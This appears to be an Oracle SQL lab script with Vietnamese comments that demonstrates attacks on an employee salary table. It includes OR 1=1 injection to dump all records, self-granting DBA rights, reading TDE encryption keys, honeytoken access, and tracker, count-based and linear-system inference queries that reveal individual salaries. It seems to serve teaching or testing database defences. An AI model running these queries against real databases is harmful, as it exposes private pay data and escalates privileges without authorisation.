UPDATE SYS.NV SET luong = 5000 WHERE manv = 'NV1';
SELECT * FROM SYSTEM.NV WHERE manv = 'NV_TRAP';

SELECT * FROM SYSTEM.NV WHERE manv = 'NV1' OR 1=1;
GRANT DBA TO U2;
SELECT COUNT(*), SUM(luong) FROM SYSTEM.NV WHERE gioitinh = 'Nam' AND manv != 'NV1' AND luong < 5000;


-- Kẻ tấn công inject mệnh đề OR 1=1 để dump toàn bộ danh sách nhân viên
SELECT * FROM SYSTEM.NV WHERE manv = 'NV1' OR 1=1;

-- Leo thang đặc quyền (Privilege Escalation - Tự cấp quyền DBA tối cao) 
GRANT DBA TO U1;

-- Truy cập khóa mã hóa trái phép (Trực tiếp vào kho khóa Oracle TDE) 
SELECT * FROM V$ENCRYPTION_KEYS;

-- Tấn công trực tiếp (Direct Attack - Truy vấn chạm bản ghi bẫy Honeytoken) 
SELECT * FROM SYSTEM.NV WHERE manv = 'NV_TRAP';

--. Tấn công dựa vào đếm (Count-based Attack - Lấy SUM khi COUNT = 1 để bóc trần lương cá nhân) 
SELECT SUM(luong) FROM SYSTEM.NV WHERE gioitinh = 'Nu' AND luong < 900;

-- Tấn công trình theo dõi (Tracker Attack - Dùng điều kiện bù '!=' để lách Query-Set-Size) 
SELECT COUNT(*), SUM(luong) FROM SYSTEM.NV WHERE gioitinh = 'Nam' AND manv != 'NV1' AND luong < 5000;

-- Tấn công hệ tuyến tính (Linear System Attack - Truy vấn tập con chồng lấn để lập hệ phương trình A*X = B) 
SELECT SUM(luong) FROM SYSTEM.NV WHERE manv IN ('NV1', 'NV2');